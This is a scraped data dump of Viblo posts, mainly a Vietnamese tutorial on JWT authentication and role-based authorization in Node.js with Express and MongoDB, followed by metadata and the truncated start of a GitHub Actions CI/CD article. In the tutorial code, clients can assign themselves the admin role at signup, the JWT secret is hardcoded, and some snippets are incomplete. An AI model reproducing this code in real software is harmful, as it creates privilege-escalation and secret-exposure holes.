\u0111\u00e2y l\u00e0 ph\u1ea7n m\u1ec1m qu\u1ea3n tr\u1ecb c\u01a1 s\u1edf d\u1eef li\u1ec7u.\n* T\u1ea3i v\u00e0 c\u00e0i \u0111\u1eb7t Visual code ho\u1eb7c Sublime Text 3: d\u00f9ng \u0111\u1ec3 vi\u1ebft code nhanh h\u01a1n\n\n# VII. C\u1ea5u tr\u00fac th\u01b0 m\u1ee5c d\u1ef1 \u00e1n\nD\u01b0\u1edbi \u0111\u00e2y l\u00e0 c\u1ea5u tr\u00fac th\u01b0 m\u1ee5c m\u00e3 ngu\u1ed3n c\u1ee7a d\u1ef1 \u00e1n trong b\u00e0i vi\u1ebft n\u00e0y:\n\n![](https://images.viblo.asia/829cc975-d3d9-4a61-af53-f02aa5748188.PNG)\n\n# VIII. T\u1ea1o d\u1ef1 \u00e1n NodeJS\n\n\u0110\u1ec3 b\u1eaft \u0111\u1ea7u, ch\u00fang ta c\u1ea7n t\u1ea1o m\u1edbi m\u1ed9t d\u1ef1 \u00e1n NodeJS. Ph\u1ea7n n\u00e0y th\u00ec m\u00ecnh s\u1ebd kh\u00f4ng h\u01b0\u1edbng d\u1eabn l\u1ea1i n\u1eefa, b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o c\u00e1ch l\u00e0m chi ti\u1ebft t\u1ea1i \u0111\u00e2y: T\u1ea1o d\u1ef1 \u00e1n NodeJS\n\nKhi t\u1ea1o d\u1ef1 \u00e1n m\u1edbi xong, b\u1ea1n c\u1ea7n t\u1ea1o th\u00eam c\u00e1c th\u01b0 vi\u1ec7n c\u1ea7n thi\u1ebft: express, cors, body-parser, mongoose, jsonwebtoken v\u00e0 bcryptjs.\n\nS\u1eed d\u1ee5ng npm \u0111\u1ec3 c\u00e0i \u0111\u1eb7t ch\u00fang, g\u00f5 l\u1ec7nh sau:\n\n```php\nnpm install express mongoose body-parser cors jsonwebtoken bcryptjs --save\n```\n\nN\u1ed9i dung package.json c\u1ee7a d\u1ef1 \u00e1n nh\u01b0 sau:\n\n```php\n{\n  "name": "authentication-authorization-nodejs-jwt-mongodb",\n  "version": "1.0.0",\n  "description": "Node.js + MongoDB: JWT Authentication & Authorization",\n  "main": "server.js",\n  "scripts": {\n    "test": "echo \\"Error: no test specified\\" && exit 1"\n  },\n  "keywords": [\n    "node.js",\n    "express",\n    "jwt",\n    "authentication",\n    "mongodb"\n  ],\n  "author": "bezkoder.com",\n  "license": "ISC",\n  "dependencies": {\n    "bcryptjs": "^2.4.3",\n    "body-parser": "^1.19.0",\n    "cors": "^2.8.5",\n    "express": "^4.17.1",\n    "jsonwebtoken": "^8.5.1",\n    "mongoose": "^5.9.1"\n  }\n}\n```\n\n# IX. Thi\u1ebft l\u1eadp Express web server\nTrong th\u01b0 m\u1ee5c g\u1ed1c c\u1ee7a d\u1ef1 \u00e1n, t\u1ea1o th\u00eam t\u1ec7p server.js c\u00f3 n\u1ed9i dung nh\u01b0 sau:\n\n```php\nconst express = require("express");\nconst bodyParser = require("body-parser");\nconst cors = require("cors");\nconst app = express();\nvar corsOptions = {\n  origin: "http://localhost:8081"\n};\napp.use(cors(corsOptions));\n// parse requests of content-type - application/json\napp.use(bodyParser.json());\n// parse requests of content-type - application/x-www-form-urlencoded\napp.use(bodyParser.urlencoded({ extended: true }));\n// simple route\napp.get("/", (req, res) => {\n  res.json({ message: "Welcome to VNTALKING application." });\n});\n// set port, listen for requests\nconst PORT = process.env.PORT || 8080;\napp.listen(PORT, () => {\n  console.log(`Server is running on port ${PORT}.`);\n});\n```\n\nM\u00ecnh s\u1ebd gi\u1ea3i th\u00edch m\u1ed9t ch\u00fat v\u1ec1 \u0111o\u1ea1n code trong server.js:\n\n* Ch\u00fang ta import Express \u0111\u1ec3 t\u1ea1o REST API\n* Th\u01b0 vi\u1ec7n body-parser \u0111\u01b0\u1ee3c d\u00f9ng \u0111\u1ec3 parse c\u00e1c request v\u00e0o body object.\n* Import th\u01b0 vi\u1ec7n cors cung c\u1ea5p Express middleware d\u00f9ng \u0111\u1ec3 b\u1eadt t\u00ednh n\u0103ng CORS\n\nCu\u1ed1i c\u00f9ng, b\u1ea1n c\u00f3 th\u1ec3 ch\u1ea1y th\u1eed \u1ee9ng d\u1ee5ng b\u1eb1ng l\u1ec7nh: npm start\n\nTruy c\u1eadp v\u00e0o tr\u00ecnh duy\u1ec7t theo \u0111\u01b0\u1eddng d\u1eabn: http://localhost:8080/\n\n![](https://images.viblo.asia/718243f0-d0b5-4883-85d5-24a42fea3a21.PNG)\n\n# X. C\u1ea5u h\u00ecnh k\u1ebft n\u1ed1i MongoDB\nTrong th\u01b0 m\u1ee5c app, t\u1ea1o ri\u00eang m\u1ed9t th\u01b0 m\u1ee5c m\u1edbi, \u0111\u1eb7t t\u00ean l\u00e0 config. Th\u01b0 m\u1ee5c n\u00e0y s\u1ebd ch\u1ee9a t\u1ea5t c\u1ea3 c\u00e1c t\u1ec7p li\u00ean quan t\u1edbi c\u1ea5u h\u00ecnh \u1ee9ng d\u1ee5ng.\n\nTrong th\u01b0 m\u1ee5c config, b\u1ea1n t\u1ea1o t\u1ec7p db.config.js \u0111\u1ec3 th\u00eam c\u00e1c th\u00f4ng tin c\u00e0i \u0111\u1eb7t c\u01a1 s\u1edf d\u1eef li\u1ec7u MongoDB cho \u1ee9ng d\u1ee5ng:\n\n```php\nmodule.exports = {\n  HOST: "localhost",\n  PORT: 27017,\n  DB: "vntalking_db"\n```\n\n# XI. \u0110\u1ecbnh ngh\u0129a Mongoose Model\nTrong th\u01b0 m\u1ee5c model, b\u1ea1n t\u1ea1o User v\u00e0 Role model nh\u01b0 sau:\n\nmodels/role.model.js\n\n```php\nconst mongoose = require("mongoose");\nconst Role = mongoose.model(\n  "Role",\n  new mongoose.Schema({\n    name: String\n  })\n);\nmodule.exports = Role;\n```\n\nmodels/user.model.js\n\n```php\nconst mongoose = require("mongoose");\nconst User = mongoose.model(\n  "User",\n  new mongoose.Schema({\n    username: String,\n    email: String,\n    password: String,\n    roles: [\n      {\n        type: mongoose.Schema.Types.ObjectId,\n        ref: "Role"\n      }\n    ]\n  })\n);\nmodule.exports = User;\n```\n\nC\u00e1c Mongoose Models n\u00e0y s\u1ebd \u0111\u1ea1i di\u1ec7n cho collection \u0111\u01b0\u1ee3c t\u1ea1o trong MongoDB. Khi b\u1ea1n ch\u1ea1y ch\u01b0\u01a1ng tr\u00ecnh, Mongoose s\u1ebd t\u1ef1 \u0111\u1ed9ng t\u1ea1o hai collections c\u00f3 t\u00ean l\u00e0: users v\u00e0 roles.\n\nSau khi \u0111\u00e3 khai b\u00e1o xong, b\u1ea1n kh\u00f4ng c\u1ea7n thi\u1ebft ph\u1ea3i t\u1ea1o c\u00e1c h\u00e0m CRUD (\u0111\u1ecdc ghi c\u01a1 s\u1edf d\u1eef li\u1ec7u) v\u00ec Mongoose \u0111\u00e3 h\u1ed7 tr\u1ee3 s\u1eb5n r\u1ed3i. V\u00ed d\u1ee5:\n\n* T\u1ea1o m\u1edbi m\u1ed9t User: c\u00f3 h\u00e0m object.save()\n* T\u00ecm m\u1ed9t User theo Id: S\u1eed d\u1ee5ng User.findById(id)\n* T\u00ecm User theo email: User.findOne({ email: \u2026 })\n* T\u00ecm t\u1ea5t c\u1ea3 roles: Role.find({\u2026})\n\nNh\u1eefng ch\u1ee9c n\u0103ng s\u1ebd \u0111\u01b0\u1ee3c ch\u00fang ta s\u1eed d\u1ee5ng trong Controllers. C\u1ee9 b\u00ecnh t\u0129nh nh\u00e9.\n\n# XII. Kh\u1edfi t\u1ea1o Mongoose\nB\u00e2y gi\u1edd ch\u00fang ta t\u1ea1o app/models/index.js v\u1edbi n\u1ed9i dung sau:\n\n```php\nconst mongoose = require(\'mongoose\');\nmongoose.Promise = global.Promise;\nconst db = {};\ndb.mongoose = mongoose;\ndb.user = require("./user.model");\ndb.role = require("./role.model");\ndb.ROLES = ["user", "admin", "moderator"];\nmodule.exports = db;\n```\n\nM\u1edf l\u1ea1i t\u1ec7p server.js \u0111\u1ec3 th\u00eam \u0111o\u1ea1n m\u00e3 sau \u0111\u1ec3 m\u1edf k\u1ebft n\u1ed1i Mongoose v\u1edbi c\u01a1 s\u1edf d\u1eef li\u1ec7u MongoDB.\n\n```php\n...\nconst app = express();\napp.use(...);\nconst db = require("./app/models");\nconst Role = db.role;\ndb.mongoose\n  .connect(`mongodb://${dbConfig.HOST}:${dbConfig.PORT}/${dbConfig.DB}`, {\n    useNewUrlParser: true,\n    useUnifiedTopology: true\n  })\n  .then(() => {\n    console.log("Successfully connect to MongoDB.");\n    initial();\n  })\n  .catch(err => {\n    console.error("Connection error", err);\n    process.exit();\n  });\n...\nfunction initial() {\n  Role.estimatedDocumentCount((err, count) => {\n    if (!err && count === 0) {\n      new Role({\n        name: "user"\n      }).save(err => {\n        if (err) {\n          console.log("error", err);\n        }\n        console.log("added \'user\' to roles collection");\n      });\n      new Role({\n        name: "moderator"\n      }).save(err => {\n        if (err) {\n          console.log("error", err);\n        }\n        console.log("added \'moderator\' to roles collection");\n      });\n      new Role({\n        name: "admin"\n      }).save(err => {\n        if (err) {\n          console.log("error", err);\n        }\n        console.log("added \'admin\' to roles collection");\n      });\n    }\n  });\n}\n```\n\nH\u00e0m initial() cho ph\u00e9p ch\u00fang ta th\u00eam d\u1eef li\u1ec7u 3 roles v\u00e0o trong c\u01a1 s\u1edf d\u1eef li\u1ec7u, n\u1ebfu trong DB c\u00f3 r\u1ed3i th\u00ec b\u1ecf qua.\n\n# XIII. C\u1ea5u h\u00ecnh Auth Key\nC\u00e1c h\u00e0m jsonwebtoken nh\u01b0: verify(),  sign() s\u1ebd c\u1ea7n t\u1edbi m\u1ed9t secret key \u0111\u1ec3 encode hay decode chu\u1ed7i token.\n\nTrong th\u01b0 m\u1ee5c app/config, t\u1ea1o th\u00eam auth.config.js v\u1edbi n\u1ed9i dung sau:\n\n```php\nmodule.exports = {\n  secret: "vntalking-secret-key"\n};\n```\n\nTrong \u0111\u00f3, b\u1ea1n c\u00f3 th\u1ec3 t\u1ea1o chu\u1ed1i secret b\u1ea5t k\u1ef3 cho ri\u00eang b\u1ea1n.\n\n# XIV. T\u1ea1o c\u00e1c h\u00e0m middleware\nQu\u00e1 tr\u00ecnh \u0111\u1ec3 verify m\u1ed9t h\u00e0nh \u0111\u1ed9ng trong SignUp, ch\u00fang ta c\u1ea7n l\u00e0m 2 vi\u1ec7c:\n\nKi\u1ec3m tra xem t\u00ean ng\u01b0\u1eddi d\u00f9ng, email c\u00f3 b\u1ecb tr\u00f9ng l\u1eb7p trong DB hay kh\u00f4ng?\nKi\u1ec3m tra xem role \u0111\u0103ng k\u00fd c\u00f3 h\u1ee3p l\u1ec7 hay kh\u00f4ng?\nmiddlewares/verifySignUp.js\n\n```php\nconst db = require("../models");\nconst ROLES = db.ROLES;\nconst User = db.user;\ncheckDuplicateUsernameOrEmail = (req, res, next) => {\n  // Username\n  User.findOne({\n    username: req.body.username\n  }).exec((err, user) => {\n    if (err) {\n      res.status(500).send({ message: err });\n      return;\n    }\n    if (user) {\n      res.status(400).send({ message: "Failed! Username is already in use!" });\n      return;\n    }\n    // Email\n    User.findOne({\n      email: req.body.email\n    }).exec((err, user) => {\n      if (err) {\n        res.status(500).send({ message: err });\n        return;\n      }\n      if (user) {\n        res.status(400).send({ message: "Failed! Email is already in use!" });\n        return;\n      }\n      next();\n    });\n  });\n};\ncheckRolesExisted = (req, res, next) => {\n  if (req.body.roles) {\n    for (let i = 0; i < req.body.roles.length; i++) {\n      if (!ROLES.includes(req.body.roles[i])) {\n        res.status(400).send({\n          message: `Failed! Role ${req.body.roles[i]} does not exist!`\n        });\n        return;\n      }\n    }\n  }\n  next();\n};\nconst verifySignUp = {\n  checkDuplicateUsernameOrEmail,\n  checkRolesExisted\n};\nmodule.exports = verifySignUp;\n```\n\n\u0110\u1ec3 x\u1eed l\u00fd vi\u1ec7c Authentication & Authorization, ch\u00fang ta c\u1ea7n t\u1ea1o c\u00e1c h\u00e0m sau:\n\n* Ki\u1ec3m tra token c\u00f3 h\u1ee3p l\u1ec7 hay kh\u00f4ng? Ch\u00fang ta c\u00f3 th\u1ec3 l\u1ea5y th\u00f4ng tin token trong tr\u01b0\u1eddng x-access-token c\u1ee7a Header HTTP, sau \u0111\u00f3 chuy\u1ec3n cho h\u00e0m verify() x\u1eed l\u00fd.\n* Ki\u1ec3m tra role \u0111\u0103ng k\u00fd \u0111\u00e3 c\u00f3 role ch\u01b0a hay l\u00e0 tr\u1ed1ng?\n\nmiddlewares/authJwt.js\n\n```php\nconst jwt = require("jsonwebtoken");\nconst config = require("../config/auth.config.js");\nconst db = require("../models");\nconst User = db.user;\nconst Role = db.role;\nverifyToken = (req, res, next) => {\n  let token = req.headers["x-access-token"];\n  if (!token) {\n    return res.status(403).send({ message: "No token provided!" });\n  }\n  jwt.verify(token, config.secret, (err, decoded) => {\n    if (err) {\n      return res.status(401).send({ message: "Unauthorized!" });\n    }\n    req.userId = decoded.id;\n    next();\n  });\n};\nisAdmin = (req, res, next) => {\n  User.findById(req.userId).exec((err, user) => {\n    if (err) {\n      res.status(500).send({ message: err });\n      return;\n    }\n    Role.find(\n      {\n        _id: { $in: user.roles }\n      },\n      (err, roles) => {\n        if (err) {\n          res.status(500).send({ message: err });\n          return;\n        }\n        for (let i = 0; i < roles.length; i++) {\n          if (roles[i].name === "admin") {\n            next();\n            return;\n          }\n        }\n        res.status(403).send({ message: "Require Admin Role!" });\n        return;\n      }\n    );\n  });\n};\nisModerator = (req, res, next) => {\n  User.findById(req.userId).exec((err, user) => {\n    if (err) {\n      res.status(500).send({ message: err });\n      return;\n    }\n    Role.find(\n      {\n        _id: { $in: user.roles }\n      },\n      (err, roles) => {\n        if (err) {\n          res.status(500).send({ message: err });\n          return;\n        }\n        for (let i = 0; i < roles.length; i++) {\n          if (roles[i].name === "moderator") {\n            next();\n            return;\n          }\n        }\n        res.status(403).send({ message: "Require Moderator Role!" });\n        return;\n      }\n    );\n  });\n};\nconst authJwt = {\n  verifyToken,\n  isAdmin,\n  isModerator\n};\nmodule.exports = authJwt;\n```\n\nCu\u1ed1i c\u00f9ng l\u00e0 t\u1ea1o t\u1ec7p index.js trong th\u01b0 m\u1ee5c middlewares \u0111\u1ec3 export ch\u00fang:\n\n```php\nconst authJwt = require("./authJwt");\nconst verifySignUp = require("./verifySignUp");\nmodule.exports = {\n  authJwt,\n  verifySignUp\n};\n```\n\n# XV. T\u1ea1o Controllers\nCh\u00fang ta s\u1ebd l\u1ea7n l\u01b0\u1ee3t t\u1ea1o controller cho 2 ph\u1ea7n: Authentication v\u00e0 Authorization.\n\nController cho Authentication\nV\u1edbi ph\u1ea7n n\u00e0y, ch\u00fang ta c\u00f3 2 c\u00f4ng vi\u1ec7c ch\u00ednh cho t\u00ednh n\u0103ng authentication:\n\n* \u0110\u0103ng k\u00fd: t\u1ea1o ng\u01b0\u1eddi d\u00f9ng m\u1edbi v\u00e0 l\u01b0u trong c\u01a1 s\u1edf d\u1eef li\u1ec7u (v\u1edbi role m\u1eb7c \u0111\u1ecbnh l\u00e0 User n\u1ebfu kh\u00f4ng ch\u1ec9 \u0111\u1ecbnh tr\u01b0\u1edbc l\u00fac \u0111\u0103ng k\u00fd).\n* \u0110\u0103ng nh\u1eadp: qu\u00e1 tr\u00ecnh \u0111\u0103ng nh\u1eadp g\u1ed3m 4 b\u01b0\u1edbc:\n    * T\u00ecm username trong c\u01a1 s\u1edf d\u1eef li\u1ec7u,\n    * N\u1ebfu username t\u1ed3n t\u1ea1i, so s\u00e1nh password v\u1edbi password trong CSDL s\u1eed d\u1ee5ng. N\u1ebfu password kh\u1edbp, t\u1ea1o token b\u1eb1ng jsonwebtoken r\u1ed3i tr\u1ea3 v\u1ec1 client v\u1edbi th\u00f4ng tin User k\u00e8m access-Token\nNguy\u00ean l\u00fd ch\u1ec9 c\u00f3 nh\u01b0 v\u1eady, gi\u1edd l\u00e0 m\u00e3 ngu\u1ed3n:\n\ncontrollers/auth.controller.js\n\n```php\nconst config = require("../config/auth.config");\nconst db = require("../models");\nconst User = db.user;\nconst Role = db.role;\nvar jwt = require("jsonwebtoken");\nvar bcrypt = require("bcryptjs");\nexports.signup = (req, res) => {\n  const user = new User({\n    username: req.body.username,\n    email: req.body.email,\n    password: bcrypt.hashSync(req.body.password, 8)\n  });\n  user.save((err, user) => {\n    if (err) {\n      res.status(500).send({ message: err });\n      return;\n    }\n    if (req.body.roles) {\n      Role.find(\n        {\n          name: { $in: req.body.roles }\n        },\n        (err, roles) => {\n          if (err) {\n            res.status(500).send({ message: err });\n            return;\n          }\n          user.roles = roles.map(role => role._id);\n          user.save(err => {\n            if (err) {\n              res.status(500).send({ message: err });\n              return;\n            }\n            res.send({ message: "User was registered successfully!" });\n          });\n        }\n      );\n    } else {\n      Role.findOne({ name: "user" }, (err, role) => {\n        if (err) {\n          res.status(500).send({ message: err });\n          return;\n        }\n        user.roles = [role._id];\n        user.save(err => {\n          if (err) {\n            res.status(500).send({ message: err });\n            return;\n          }\n          res.send({ message: "User was registered successfully!" });\n        });\n      });\n    }\n  });\n};\nexports.signin = (req, res) => {\n  User.findOne({\n    username: req.body.username\n  })\n    .populate("roles", "-__v")\n    .exec((err, user) => {\n      if (err) {\n        res.status(500).send({ message: err });\n        return;\n      }\n      if (!user) {\n        return res.status(404).send({ message: "User Not found." });\n      }\n      var passwordIsValid = bcrypt.compareSync(\n        req.body.password,\n        user.password\n      );\n      if (!passwordIsValid) {\n        return res.status(401).send({\n          accessToken: null,\n          message: "Invalid Password!"\n        });\n      }\n      var token = jwt.sign({ id: user.id }, config.secret, {\n        expiresIn: 86400 // 24 hours\n      });\n      var authorities = [];\n      for (let i = 0; i < user.roles.length; i++) {\n        authorities.push("ROLE_" + user.roles[i].name.toUpperCase());\n      }\n      res.status(200).send({\n        id: user._id,\n        username: user.username,\n        email: user.email,\n        roles: authorities,\n        accessToken: token\n      });\n    });\n};\n```\n\nController cho Authorization\nCh\u00fang ta c\u00f3 4 APIs ch\u00ednh cho vi\u1ec7c ph\u00e2n quy\u1ec1n:\n\n* /api/test/all\n* /api/test/user\n* /api/test/mod\n* /api/test/admin\n\ncontrollers/user.controller.js\n\n```php\nexports.allAccess = (req, res) => {\n  res.status(200).send("Public Content.");\n};\nexports.userBoard = (req, res) => {\n  res.status(200).send("User Content.");\n};\nexports.adminBoard = (req, res) => {\n  res.status(200).send("Admin Content.");\n};\nexports.moderatorBoard = (req, res) => {\n  res.status(200).send("Moderator Content.");\n};\n```\n\nPh\u1ea7n ti\u1ebfp theo, ch\u00fang ta s\u1ebd k\u1ebft h\u1ee3p c\u00e1c controller n\u00e0y v\u1edbi middleware. M\u1ecdi ng\u01b0\u1eddi c\u1ea3m th\u1ea5y m\u1ecfi th\u00ec ngh\u1ec9 ng\u01a1i, l\u00e0m c\u1ed1c cafe \u0111\u1ec3 l\u1ea5y s\u1ee9c ti\u1ebfp t\u1ee5c nh\u00e9.\n\n# XVI. \u0110\u1ecbnh ngh\u0129a Routes\nKhi m\u1ed9t client g\u1eedi request t\u1edbi web server s\u1eed d\u1ee5ng HTTP (GET, POST, PUT, DELETE) , ch\u00fang ta  c\u1ea7n \u0111\u1ecbnh ngh\u0129a, x\u00e1c \u0111\u1ecbnh c\u00e1ch server ti\u1ebfp nh\u1eadn v\u00e0 ph\u1ea3n h\u1ed3i nh\u01b0 th\u1ebf n\u00e0o. \u0110\u00e2y ch\u00ednh l\u00e0 c\u00f4ng d\u1ee5ng c\u1ee7a c\u00e1c route.\n\nCh\u00fang ta chia c\u00e1c routes th\u00e0nh 2 nh\u00f3m: Authentication v\u00e0 Authorization\n\nAuthentication:\n\n* POST /api/auth/signup\n* POST /api/auth/signin\n* routes/auth.routes.js\n\n```php\nconst { verifySignUp } = require("../middlewares");\nconst controller = require("../controllers/auth.controller");\nmodule.exports = function(app) {\n  app.use(function(req, res, next) {\n    res.header(\n      "Access-Control-Allow-Headers",\n      "x-access-token, Origin, Content-Type, Accept"\n    );\n    next();\n  });\n  app.post(\n    "/api/auth/signup",\n    [\n      verifySignUp.checkDuplicateUsernameOrEmail,\n      verifySignUp.checkRolesExisted\n    ],\n    controller.signup\n  );\n  app.post("/api/auth/signin", controller.signin);\n};\n```\n\n\u0110\u1eebng qu\u00ean th\u00eam c\u00e1c routes v\u00e0o trong t\u1ec7p server.js\n\n```php\n...\n// routes\nrequire(\'./app/routes/auth.routes\')(app);\nrequire(\'./app/routes/user.routes\')(app);\n// set port, listen for requests\n...\n```\n\nNh\u01b0 v\u1eady l\u00e0 ch\u00fang ta \u0111\u00e3 ho\u00e0n th\u00e0nh d\u1ef1 \u00e1n Node.js v\u1edbi Authentication r\u1ed3i \u0111\u1ea5y. B\u1ea1n c\u00f3 th\u1ec3 t\u1ea3i to\u00e0n b\u1ed9 m\u00e3 ngu\u1ed3n trong b\u00e0i vi\u1ebft t\u1ea1i \u0111\u00e2y:\n\nPh\u1ea7n ti\u1ebfp theo, ch\u00fang ta s\u1ebd ti\u1ebfn h\u00e0nh ch\u1ea1y v\u00e0 test th\u1eed ch\u01b0\u01a1ng tr\u00ecnh nh\u00e9.\n\n# XVII. Run & Test ch\u01b0\u01a1ng tr\u00ecnh\n\u0110\u1ec3 ch\u1ea1y ch\u01b0\u01a1ng tr\u00ecnh, b\u1ea1n ch\u1ec9 c\u1ea7n g\u00f5 l\u1ec7nh: npm start\n\nSau khi ch\u01b0\u01a1ng tr\u00ecnh ch\u1ea1y, ch\u00fang s\u1ebd t\u1ef1 \u0111\u1ed9ng t\u1ea1o v\u00e0 th\u00eam 3 roles c\u1ea7n thi\u1ebft v\u00e0o DB. S\u1eed d\u1ee5ng Robo3T \u0111\u1ec3 xem d\u1eef li\u1ec7u trong MongoDB.\n\n![](https://images.viblo.asia/927caa04-f747-4e70-88b4-785b34cac5d5.PNG)\n\nC\u00f3 nhi\u1ec1u \u1ee9ng d\u1ee5ng \u0111\u1ec3 test REST API, m\u00ecnh hay d\u00f9ng Postman. Ch\u00fang ta test th\u1eed v\u1edbt API \u0111\u0103ng k\u00fd m\u1edbi: POST /api/auth/signup. C\u00e1c API kh\u00e1c, c\u00e1c b\u1ea1n t\u1ef1 th\u1eed nh\u00e9.\n\n![](https://images.viblo.asia/8a8d8c16-bbb6-4156-a0d1-1994a9558b8c.PNG)\n\n# XVIII. Thay l\u1eddi k\u1ebft\nB\u00e0i vi\u1ebft \u0111\u1ebfn \u0111\u00e2y l\u00e0 k\u1ebft th\u00fac, ch\u00fang ta \u0111\u00e3 kh\u00e1m ph\u00e1 v\u00e0 th\u1ef1c hi\u1ec7n x\u00e2y d\u1ef1ng \u1ee9ng d\u1ee5ng Node.js \u0111\u1ec3 Authentication v\u00e0 Authorization s\u1eed d\u1ee5ng JWT (JSONWebToken).\n\nM\u00ecnh hi v\u1ecdng b\u00e0i vi\u1ebft n\u00e0y s\u1ebd c\u00f3 \u00edch cho b\u1ea1n. N\u1ebfu c\u00f3 th\u1eafc m\u1eafc h\u00e3y \u0111\u1ec3 l\u1ea1i b\u00ecnh lu\u1eadn b\u00ean d\u01b0\u1edbi nh\u00e9.\n\n\ud83d\udca6 Ngu\u1ed3n tham kh\u1ea3o:\n\n* https://bezkoder.com/node-js-mongodb-auth-jwt/\n* https://nodejs.org/en/docs/',
      published_at: "2020-11-21 12:27:59",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:48:06",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 13,
      points: 4,
      views_count: 765,
      clips_count: 5,
      comments_count: 3,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/161776fd-e0dd-465e-9cab-457d13487567.PNG",
      user: {
        data: {
          id: 26040,
          url: "https://viblo.asia/u/lxc",
          avatar: "a62c4d68-cfa4-41bd-b8cf-439ac6cffa97.jpg",
          name: "lxc",
          username: "lxc",
          followers_count: 10,
          reputation: 410,
          posts_count: 23,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "jwt",
            name: "jwt",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=jwt&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "mongodb",
            name: "MongoDB",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=MongoDB&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 36620,
            url: "https://viblo.asia/u/DucTho",
            avatar: "0e7042e7-28e1-40ca-955d-0f1ea025bdef.png",
            name: "Duc Tho",
            username: "DucTho",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 50427,
            url: "https://viblo.asia/u/loizenai",
            avatar: "a5bc97e7-69cc-4ee0-9199-c0c77d33006e.jpg",
            name: "loizenai",
            username: "loizenai",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 51134,
            url: "https://viblo.asia/u/hai157",
            avatar: "8fac9b8f-2fd9-4603-b648-5abd79523392.jpg",
            name: "Ho\u00e0ng H\u1ea3i",
            username: "hai157",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 48682,
      title: "CI/CD cho \u1ee9ng d\u1ee5ng Node.js v\u1edbi Github Action",
      slug: "Ljy5V4bzZra",
      url:
        "https://viblo.asia/p/cicd-cho-ung-dung-nodejs-voi-github-action-Ljy5V4bzZra",
      user_id: 10418,
      moderation: null,
      transliterated: "cicd-cho-ung-dung-nodejs-voi-github-action",
      contents_short:
        "B\u00e0i vi\u1ebft n\u00e0y s\u1ebd \u0111\u1ec1 c\u1eadp \u0111\u1ebfn nh\u1eefng \u0111i\u1ec1u sau:\n\n* S\u1eed d\u1ee5ng Docker \u0111\u1ec3 kh\u1edfi \u0111\u1ed9ng 1 app\n* S\u1eed d\u1ee5ng c\u00e1c GitHub Action \u0111\u1ec3 t\u00edch h\u1ee3p li\u00ean t\u1ee5c (CI) \u1ee9ng d\u1ee5ng c\u1ee7a b\u1ea1n\n* S\u1eed d\u1ee5ng c\u00e1c GitHub Action \u0111\u1ec3 tri\u1ec3n khai li\u00ean...",
      contents:
        "B\u00e0i vi\u1ebft n\u00e0y s\u1ebd \u0111\u1ec1 c\u1eadp \u0111\u1ebfn nh\u1eefng \u0111i\u1ec1u sau:\n\n* S\u1eed d\u1ee5ng Docker \u0111\u1ec3 kh\u1edfi \u0111\u1ed9ng 1 app\n* S\u1eed d\u1ee5ng c\u00e1c GitHub Action \u0111\u1ec3 t\u00edch h\u1ee3p li\u00ean t\u1ee5c (CI) \u1ee9ng d\u1ee5ng c\u1ee7a b\u1ea1n\n* S\u1eed d\u1ee5ng c\u00e1c GitHub Action \u0111\u1ec3 tri\u1ec3n khai li\u00ean t\u1ee5c (CD) b\u1eb1ng c\u00e1ch \u0111\u1ea9y image Docker v\u00e0o Docker registry (Docker Hub)\n\nFlow s\u1ebd \u0111\u1ea1i lo\u1ea1i nh\u01b0 n\u00e0y\n\n![](https://images.viblo.asia/25ef678b-f2ef-49f0-a027-c3db79645835.png)\n\nCode \u0111\u1ea7y \u0111\u1ee7 s\u1ebd c\u00f3 \u1edf [trong n\u00e0y](https://github.com/abhinavdhasmana/github-action-example-node)\n\n## S\u1eed d\u1ee5ng Docker \u0111\u1ec3 kh\u1edfi \u0111\u1ed9ng 1 app\n\nThi\u1ebft l\u1eadp docker cho 1 \u1ee9ng d\u1ee5ng kh\u00e1 \u0111\u01a1n gi\u1ea3n. \u0110i\u1ec1u b\u1ea1n c\u1ea7n l\u00e0 1 file `Dockerfile` v\u00e0 th\u00eam option `.dockerignore`\n\n\u0110\u00e2y l\u00e0 1 v\u00ed d\u1ee5\n\n{@embed: https://gist.github.com/abhinavdhasmana/a05eb743a484b104804e7b0db0b1fc1a#file-dockerfile}\n\nN\u00f3 s\u1ebd copy package.json, ch\u1ea1y npm install v\u00e0 start server.\n\u0110\u1ec3 \u0111\u1ea3m b\u1ea3o t\u1ec7p l\u00e0 ch\u00ednh x\u00e1c, b\u1ea1n c\u00f3 th\u1ec3 ch\u1ea1y `docker build -t abhinavdhasmana/github-action-example-node .` t\u1eeb th\u01b0 root. N\u1ebfu b\u1ea1n ch\u1ea1y `docker images`, b\u1ea1n s\u1ebd th\u1ea5y image b\u1ea3n lastest. B\u1ea1n c\u0169ng c\u00f3 th\u1ec3 ch\u1ea1y container b\u1eb1ng l\u1ec7nh `docker run -d -p 3000:3000 abhinavdhasmana/github-action-example-node`. Truy c\u1eadp tr\u00ecnh duy\u1ec7t \u0111\u1ebfn `http://localhost:3000/` v\u00e0 c\u00f3 1 \u0111o\u1ea1n text s\u1ebd xu\u1ea5t hi\u1ec7n.\n\n## Github Action l\u00e0 g\u00ec, v\u00e0 n\u00f3 ho\u1ea1t \u0111\u1ed9ng nh\u01b0 th\u1ebf n\u00e0o\n\n\u2018GitHub Actions\u2019 l\u00e0 m\u1ed9t API c\u00f3 th\u1ec3 ph\u1ea3n \u1ee9ng v\u1edbi b\u1ea5t k\u1ef3 s\u1ef1 ki\u1ec7n n\u00e0o, s\u1ef1 ki\u1ec7n c\u1ee7a GitHub ho\u1eb7c c\u1ee7a ch\u00ednh ch\u00fang ta. V\u00ed 